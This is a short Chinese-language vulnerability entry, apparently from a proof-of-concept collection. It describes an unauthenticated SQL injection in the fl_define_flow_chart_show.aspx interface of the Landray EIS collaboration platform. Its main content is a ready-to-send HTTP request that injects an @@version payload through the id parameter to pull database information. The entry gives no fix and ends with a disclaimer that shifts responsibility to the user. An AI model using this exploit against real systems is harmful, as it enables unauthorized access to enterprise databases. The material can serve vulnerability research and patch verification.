# 蓝凌EIS智慧协同平台fl_define_flow_chart_show SQL注入

>蓝凌EIS智慧协同平台是一款专为企业提供高效协同办公和团队合作的产品。该平台集成了各种协同工具和功能，旨在提升企业内部沟通、协作和信息共享的效率。

## 漏洞描述

蓝凌EIS智慧协同平台 fl_define_flow_chart_show等接口处未对用户输入的SQL语句进行过滤或验证导致出现SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库敏感信息。

## 漏洞类型

SQL注入

## 漏洞影响

-   蓝凌EIS智慧协同平台

## POC

```http
GET /flow/fl_define_flow_chart_show.aspx?id=1%20and%201=@@version--+ HTTP/1.1
Host: host
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
